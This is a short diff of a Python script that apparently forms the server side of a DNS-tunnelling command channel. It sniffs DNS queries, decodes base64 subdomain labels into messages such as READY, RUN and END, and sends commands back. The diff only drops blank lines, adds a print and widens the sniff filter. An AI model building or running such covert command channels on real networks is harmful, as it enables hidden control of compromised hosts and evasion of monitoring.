@@ -14,7 +14,6 @@ stop = 0
 
 def parse_end(packet):
     try:
-        
         if('RU5E' == packet[DNS].qd[DNSQR].qname.decode('utf-8').split(".")[0]):
              return True
 
@@ -28,7 +27,6 @@ def concat_msg(packet):
     try:
         global msg
         pkt_msg =packet[DNS].qd[DNSQR].qname.decode('utf-8').split(".")[0]
-        
         msg += b64decode(pkt_msg.encode('utf-8')).decode('utf-8')
     except Exception as e:
         print("in parse_end")
@@ -50,6 +48,7 @@ def send_cmd(packet, command):
 
 def parse_msg(msg_lst):
     try:
+        print(msg_lst)
         if(msg_lst[-2] == 'RUN'):
             print("\n".join(msg_lst[0:-2]))
 
@@ -77,7 +76,7 @@ def recieve_msg():
             global msg
             prailer = "START "
             msg = ""
-            rp = sniff(filter="(udp dst port 53) and (udp src port 1337)",
+            rp = sniff(filter="(udp dst port 53)",
                        prn=concat_msg, stop_filter=parse_end, timeout=100)
             msg_lst = msg.split(" ")
             if('READY' == msg_lst[0] and avail_cmd.acquire(blocking=False)):
